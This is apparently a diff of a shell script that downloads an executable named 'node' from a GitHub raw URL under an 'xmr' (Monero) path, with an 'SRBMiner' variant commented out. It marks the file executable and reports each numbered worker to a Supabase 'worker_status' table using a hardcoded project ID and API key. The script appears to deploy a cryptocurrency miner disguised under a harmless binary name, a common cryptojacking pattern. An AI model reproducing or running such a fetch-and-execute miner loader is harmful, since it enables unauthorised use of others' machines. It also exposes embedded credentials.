@@ -1,15 +1,16 @@
 #!/bin/sh
+WORKER_NUMBER=$1
+PASSHOURS=$(date +%S)
+
+echo "start ${WORKER_NUMBER}"
 # SRBMiner
 # curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/node
 
 # xmr
 curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/xmr/linux-static/node
-
 chmod +x node
-WORKER_NUMBER=$1
-PASSHOURS=$(date +%S)
-echo "start ${WORKER_NUMBER}"
 
+# supabase.co 
 PROJECT="plyyisutdhzkhyxowznt"
 APIKEY="sb_publishable_BpW4yiofh6uN0lZ_2fl1Sg_BXIYS5LO"
 URL="https://$PROJECT.supabase.co/rest/v1/worker_status"
